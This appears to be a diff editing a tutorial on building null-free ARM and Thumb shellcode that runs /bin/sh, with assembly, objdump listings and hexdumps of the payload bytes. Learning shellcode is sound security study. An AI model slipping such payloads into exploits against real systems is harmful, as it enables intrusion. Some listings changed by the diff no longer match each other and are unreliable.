@@ -13,7 +13,7 @@ Using the shell.s example from Part 1
     .global _start
 
     _start:
-        add r0, pc, #12
+        adr r0, _string
         mov r1, #0
         mov r2, #0
         mov r7, #11
@@ -28,23 +28,24 @@ After compiling
 
 The object code looked like this
 
-    # objdump -d shell.o
+	$ objdump -d shell.o
 
-    shell.o:     file format elf32-littlearm
+	shell.o:     file format elf32-littlearm
 
 
-    Disassembly of section .text:
+	Disassembly of section .text:
 
-    00000000 <_start>:
-       0:   e28f000c        add     r0, pc, #12
-       4:   e3a01000        mov     r1, #0
-       8:   e3a02000        mov     r2, #0
-       c:   e3a0700b        mov     r7, #11
-      10:   ef000001        svc     0x00000001
+	00000000 <_start>:
+	   0:   e28f000c        add     r0, pc, #12
+	   4:   e3a01000        mov     r1, #0
+	   8:   e3a02000        mov     r2, #0
+	   c:   e3a0700b        mov     r7, #11
+	  10:   ef000001        svc     0x00000001
 
-    00000014 <_string>:
-      14:   6e69622f        .word   0x6e69622f
-      18:   0068732f        .word   0x0068732f
+	00000014 <_string>:
+	  14:   6e69622f        .word   0x6e69622f
+	  18:   0068732f        .word   0x0068732f
+
 
 The machine instructions, our "shellcode", are the 32 bit values in the second column.
 
@@ -65,7 +66,7 @@ And with [hexdump(1)][hexdump] look at the file
 
     # hexdump -C shell.bin
     00000000  0c 00 8f e2 00 10 a0 e3  00 20 a0 e3 0b 70 a0 e3  |......... ...p..|
-    00000010  00 00 00 ef 2f 62 69 6e  2f 73 68 00              |..../bin/sh.|
+    00000010  01 00 00 ef 2f 62 69 6e  2f 73 68 00              |..../bin/sh.|
     0000001c
 
 
@@ -93,7 +94,7 @@ So now are assembly **shell.s** looks like this
     .global _start
 
     _start:
-        add r0, pc, #12
+        adr r0, _string
         eor r1, r1, r1
         eor r2, r2, r2
         mov r7, #11
@@ -110,18 +111,19 @@ And the machine code like this
     shell.o:     file format elf32-littlearm
 
 
-    Disassembly of section .text:
+	Disassembly of section .text:
 
-    00000000 <_start>:
-       0:   e28f000c        add     r0, pc, #12
-       4:   e0211001        eor     r1, r1, r1
-       8:   e0222002        eor     r2, r2, r2
-       c:   e3a0700b        mov     r7, #11
-      10:   ef000001        svc     0x00000001
+	00000000 <_start>:
+	   0:   e28f000c        add     r0, pc, #12
+	   4:   e0211001        eor     r1, r1, r1
+	   8:   e0222002        eor     r2, r2, r2
+	   c:   e3a0700b        mov     r7, #11
+	  10:   ef000001        svc     0x00000001
 
-    00000014 <_string>:
-      14:   6e69622f        .word   0x6e69622f
-      18:   0068732f        .word   0x0068732f
+	00000014 <_string>:
+	  14:   6e69622f        .word   0x6e69622f
+	  18:   0068732f        .word   0x0068732f
+
 
 We got rid of a few **0x00**'s, but still have some in these instructions e2 8f **00** 0c and ef **00** **00** 01 and the NULL terminator at the end of our string.
 
@@ -175,81 +177,24 @@ This is done with the **.code 16** or **.thumb** directive. By default we start 
         bx r1
 
     .code 16
-        add r0, pc, #12
+        adr r0, _string
         eor r1, r1, r1
         eor r2, r2, r2
         mov r7, #11
         svc #1
-        nop
-
+ 
     _string:
     .asciz  "/bin/sh"
 
 Let's try it.
 
     $ as shell.s -o shell.o
-    $ ld shell.o -o shell
-    $ ./shell
-    Segmentation fault
-
-Okay, what does the object dump look like?
-
-    $ objdump -d shell.o
-
-    Disassembly of section .text:
-
-    00000000 <_start>:
-       0:   e28f1001        add     r1, pc, #1
-       4:   e12fff11        bx      r1
-       8:   a003            add     r0, pc, #12     ; (adr r0, 18 <_string+0x6>)
-       a:   4049            eors    r1, r1
-       c:   4052            eors    r2, r2
-       e:   270b            movs    r7, #11
-      10:   df01            svc     1
-
-    00000012 <_string>:
-      12:   622f            .short  0x622f
-      14:   732f6e69        .word   0x732f6e69
-      18:   0068            .short  0x0068
-      1a:   46c0            nop                     ; (mov r8, r8)
-
-
-The compiler stuck a **nop** instruction at the end to 4-byte align the code.
-
-The real problem is our offset calculation from **pc** to point to the address of our string "/bin/sh".
-
-Since instructions are now 16-bits or 2 bytes, the **pc** register is now only 4 bytes ahead instead of 8 bytes when we use it in the execute stage of an instruction.
-
-Our offset calculation should now be
-
-    0x12 - 0x8 = 0xa
-    0xa - 4 = 0x6 = 6 bytes
-
-So try that
-
-    .global _start
-
-    _start:
-        add r1, pc, #1
-        bx r1
-
-    .code 16
-        add r0, pc, #6
-        eor r1, r1, r1
-        eor r2, r2, r2
-        mov r7, #11
-        svc #1
-
-    _string:
-    .asciz  "/bin/sh"
-
-Compile
-
-    $ as -o shell.o shell.s
     shell.s: Assembler messages:
     shell.s:9: Error: invalid immediate for address calculation (value = 0x00000006)
 
+
 This error results from the fact that when we are in **thumb** mode the **add rN, pc, #immediate** has more restrictions then when in normal **arm** mode.
+The **adr r0, _string** got translated into **add r0, #6".
 
 I don't have an a online reference, but the "ARM System Developer's Guide" book, section 4.4 shows that the #immediate value has to be of the form (#immediate << 2) or a multiple of 4 when we are using the **pc** register.
 
@@ -285,7 +230,6 @@ What we can do is add a **NOP** to push the start address of the string down 2 b
 
 	_string:
 	.asciz  "/bin/sh"
-
 
 
     $ as shell.s -o shell.o
@@ -360,8 +304,8 @@ Our code now looks like this
 		add r0, pc, #8
 		eor r1, r1, r1
 		eor r2, r2, r2
-		mov r7, #11
 		strb r1, [r0, #7]
+		mov r7, #11
 		svc #1
 
 	_string:
@@ -414,7 +358,7 @@ There are real applications like just-in-time compilers that need this feature d
 
 If we link our code with the **-N** option and then look at the **readelf** dump
 
-    $ ld shell.o -o shell
+    $ ld -N shell.o -o shell
 	
 	$ readelf -l shell
 
@@ -442,10 +386,10 @@ Now dump the shellcode and check for 0x00's
 
 	# objcopy -O binary shell.o shell.bin
 
-	# hexdump -C shell.bin
-	00000000  01 10 8f e2 11 ff 2f e1  02 a0 49 40 52 40 0b 27  |....../...I@R@.'|
-	00000010  c1 71 01 df 2f 62 69 6e  2f 73 68 41              |.q../bin/shA|
+	00000000  01 10 8f e2 11 ff 2f e1  02 a0 49 40 52 40 c1 71  |....../...I@R@.q|
+	00000010  0b 27 01 df 2f 62 69 6e  2f 73 68 41              |.'../bin/shA|
 	0000001c
+
 	
 We can use [hexdump(1)][hexdump] to extract out the bytes into a usable format.
 
